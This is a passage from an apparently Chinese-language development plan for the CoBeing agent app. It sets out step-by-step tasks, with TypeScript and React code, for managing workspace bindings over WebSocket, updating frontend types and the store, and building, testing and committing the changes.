  const { agentId } = msg.payload as { agentId: string };
  const agent = this.agentRegistry?.get(agentId);
  if (!agent) {
    this.sendToClient(ws, { type: "error", payload: { message: `Agent not found: ${agentId}` } });
    break;
  }
  this.sendToClient(ws, { type: "bindings_list", payload: { agentId, bindings: agent.bindings } });
  break;
}
```

- [ ] **Step 2: 确保 import 中包含 `path` 和 `fs`**

顶部 import 检查是否已有：
```typescript
import path from "node:path";
import fs from "node:fs";
```

如无则补充。

- [ ] **Step 3: 验证构建**

```powershell
pnpm --filter @cobeing/core build
```

- [ ] **Step 4: Commit**

```bash
git add packages/core/src/api/ws-server.ts
git commit -m "feat(core): replace bind_workspace with add/remove/list binding WS commands"
```

---

### Task 10: 前端类型 + Store 更新

**Files:**
- Modify: `gui-v2/src/lib/types.ts:6`
- Modify: `gui-v2/src/stores/agents.ts`

- [ ] **Step 1: 更新前端 PermissionMode 类型**

```typescript
// types.ts 第 6 行 — 旧：
export type PermissionMode = "full-access" | "workspace-write" | "read-only" | "ask";

// 新：
export type PermissionMode = "read-only" | "workspace-readwrite"
  | "workspace-access" | "basic-access" | "full-access";
```

- [ ] **Step 2: 新增前端 WorkspaceBinding 类型**

在 types.ts 的 AgentFileInfo 接口之前新增：

```typescript
export interface WorkspaceBinding {
  path: string;
  mode: "readonly" | "readwrite";
  label?: string;
}
```

- [ ] **Step 3: AgentInfo 新增 bindings 字段**

```typescript
export interface AgentInfo {
  id: string;
  name: string;
  role: string;
  status: AgentStatus;
  model: string;
  provider: string;
  bindings?: WorkspaceBinding[];  // 新增
}
```

- [ ] **Step 4: 更新 agents store**

```typescript
// stores/agents.ts — 在 interface 中新增：
interface AgentsStore {
  // ... existing fields ...
  updateAgentBindings: (agentId: string, bindings: WorkspaceBinding[]) => void;
}

// 在 create 中新增 implementation：
updateAgentBindings: (agentId, bindings) => set((s) => ({
  agents: s.agents.map(a => a.id === agentId ? { ...a, bindings } : a),
})),
```

需要 import `WorkspaceBinding` from `@/lib/types`.

- [ ] **Step 5: 验证构建**

```powershell
cd CoBeing/gui-v2; npx tsc --noEmit
```

- [ ] **Step 6: Commit**

```bash
git add gui-v2/src/lib/types.ts gui-v2/src/stores/agents.ts
git commit -m "feat(gui): add WorkspaceBinding type + update agents store"
```

---

### Task 11: 前端 WS 绑定事件处理

**Files:**
- Modify: `gui-v2/src/hooks/useWebSocket.ts`

- [ ] **Step 1: 新增三个 WS 事件处理 case**

在 `useWebSocket.ts` 中的 switch 语句中（`workspace_bound` case 之后）新增：

```typescript
case "binding_added": {
  const ba = msg.payload as { agentId: string; bindings: WorkspaceBinding[] };
  useAgentsStore.getState().updateAgentBindings(ba.agentId, ba.bindings);
  const baName = useAgentsStore.getState().agents.find(a => a.id === ba.agentId)?.name || ba.agentId;
  emitActivity("📁", `${baName} 已添加工作区绑定`, "info", "system", ba.agentId, undefined, { agentName: baName });
  break;
}

case "binding_removed": {
  const br = msg.payload as { agentId: string; bindings: WorkspaceBinding[] };
  useAgentsStore.getState().updateAgentBindings(br.agentId, br.bindings);
  const brName = useAgentsStore.getState().agents.find(a => a.id === br.agentId)?.name || br.agentId;
  emitActivity("📁", `${brName} 已移除工作区绑定`, "info", "system", br.agentId, undefined, { agentName: brName });
  break;
}

case "bindings_list": {
  const bl = msg.payload as { agentId: string; bindings: WorkspaceBinding[] };
  useAgentsStore.getState().updateAgentBindings(bl.agentId, bl.bindings);
  break;
}
```

需要确保 `WorkspaceBinding` 已从 `@/lib/types` import。

- [ ] **Step 2: 验证构建**

```powershell
cd CoBeing/gui-v2; npx tsc --noEmit
```

- [ ] **Step 3: Commit**

```bash
git add gui-v2/src/hooks/useWebSocket.ts
git commit -m "feat(gui): handle binding_added/removed/list WS events"
```

---

### Task 12: 前端工作区绑定 UI 组件

**Files:**
- Create: `gui-v2/src/components/settings/WorkspaceBindingSection.tsx`

- [ ] **Step 1: 创建 WorkspaceBindingSection 组件**

```typescript
import { useState } from "react";
import { useAgentsStore } from "@/stores/agents";
import type { WorkspaceBinding } from "@/lib/types";

interface Props {
  agentId: string;
}

export function WorkspaceBindingSection({ agentId }: Props) {
  const agents = useAgentsStore((s) => s.agents);
  const agent = agents.find((a) => a.id === agentId);
  const bindings = agent?.bindings ?? [];
  const [showAdd, setShowAdd] = useState(false);
  const [path, setPath] = useState("");
  const [mode, setMode] = useState<"readonly" | "readwrite">("readwrite");
  const [adding, setAdding] = useState(false);

  const handleAdd = () => {
    if (!path.trim()) return;
    setAdding(true);
    window.dispatchEvent(new CustomEvent("ws-send", {
      detail: { type: "add_binding", payload: { agentId, workspacePath: path.trim(), mode } },
    }));
    setPath("");
    setMode("readwrite");
    setShowAdd(false);
    setTimeout(() => setAdding(false), 500);
  };

  const handleRemove = (bindingPath: string) => {
    window.dispatchEvent(new CustomEvent("ws-send", {
      detail: { type: "remove_binding", payload: { agentId, workspacePath: bindingPath } },
    }));
  };

  return (
    <div className="space-y-3">
      <h3 className="text-sm font-bold text-fg">工作区绑定</h3>

      {/* 原始工作区 — 只读展示 */}
      <div className="flex items-center gap-2 text-xs text-fg/50">
        <span className="w-16 shrink-0">默认</span>
        <code className="flex-1 truncate rounded bg-hover px-2 py-1 text-[11px]">
          data/agents/{agentId}/workspace/
        </code>
        <span className="shrink-0 text-[10px] px-1.5 py-0.5 rounded bg-success/10 text-success">读写</span>
      </div>

      {/* 用户绑定列表 */}
      {bindings.map((b) => (
        <div key={b.path} className="flex items-center gap-2 text-xs">
          <span className="w-16 shrink-0 text-fg/50">{b.label || "绑定"}</span>
          <code className="flex-1 truncate rounded bg-hover px-2 py-1 text-[11px]">{b.path}</code>
          <span className={`shrink-0 text-[10px] px-1.5 py-0.5 rounded ${
            b.mode === "readwrite" ? "bg-success/10 text-success" : "bg-warning/10 text-warning"
          }`}>
            {b.mode === "readwrite" ? "读写" : "只读"}
          </span>
          <button
            className="shrink-0 text-fg/30 hover:text-danger transition-colors px-1"
            onClick={() => handleRemove(b.path)}
            title="移除绑定"
          >
            ×
          </button>
        </div>
      ))}

      {/* 空状态 */}
      {bindings.length === 0 && (
        <p className="text-xs text-fg/30">未绑定外部目录</p>
      )}

      {/* 添加绑定 */}
      {showAdd ? (
        <div className="space-y-2 rounded-lg border border-bdr/40 p-3 bg-surface">
          <input
            type="text"
            value={path}
            onChange={(e) => setPath(e.target.value)}
            placeholder="输入要绑定的目录路径..."
            className="w-full rounded bg-hover px-2 py-1 text-xs text-fg outline-none"
          />
          <div className="flex items-center gap-2">
            <select
              value={mode}
              onChange={(e) => setMode(e.target.value as "readonly" | "readwrite")}
              className="rounded bg-hover px-2 py-1 text-xs text-fg outline-none"
            >
              <option value="readwrite">读写</option>
              <option value="readonly">只读</option>
            </select>
            <button
              className="rounded bg-accent px-3 py-1 text-xs text-white disabled:opacity-40"
              onClick={handleAdd}
              disabled={!path.trim() || adding}
            >
              确认
            </button>
            <button
              className="rounded px-2 py-1 text-xs text-fg/50 hover:text-fg"
              onClick={() => setShowAdd(false)}
            >
              取消
            </button>
          </div>
        </div>
      ) : (
        <button
          className="text-xs text-accent hover:underline"
          onClick={() => setShowAdd(true)}
        >
          + 添加绑定
        </button>
      )}
    </div>
  );
}
```

- [ ] **Step 2: 将组件接入 Agent 设置面板**

找到设置面板中 Agent 详情区域，在合适位置插入：

```typescript
import { WorkspaceBindingSection } from "./WorkspaceBindingSection";

// 在 Agent 详情渲染中：
<WorkspaceBindingSection agentId={selectedAgent} />
```

注：具体插入位置需读取设置面板组件确认。

- [ ] **Step 3: 验证构建**

```powershell
cd CoBeing/gui-v2; npx tsc --noEmit
```

- [ ] **Step 4: Commit**

```bash
git add gui-v2/src/components/settings/WorkspaceBindingSection.tsx
git commit -m "feat(gui): add WorkspaceBindingSection UI component"
```

---

### Task 13: 全量构建 + 测试验证

- [ ] **Step 1: 全量构建**

```powershell
cd CoBeing; pnpm build
```

Expected: 6 packages build pass

- [ ] **Step 2: 运行全部测试**

```powershell
cd CoBeing; pnpm test
```

Expected: 所有 test pass（现有 282 + 新增 bash-classifier test 10 + 更新 permission test）

- [ ] **Step 3: GUI 构建验证**

```powershell
cd CoBeing/gui-v2; npx tsc --noEmit
```

Expected: 零类型错误

- [ ] **Step 4: 更新文档**

更新 `PROGRESS.md` 和 `PROGRESS-LITE.md`：
```
- [New Feature] 方案 5：权限分级免审批 + 工作区绑定 — 5 级权限 + bash 命令分级 + 多绑定支持
```
更新 `PLAN-STATUS.md`：窗口 A 标记为已完成。

- [ ] **Step 5: Commit**

```bash
git add PROGRESS.md PROGRESS-LITE.md PLAN-STATUS.md
git commit -m "docs: update progress for 方案5 permission system redesign"
```
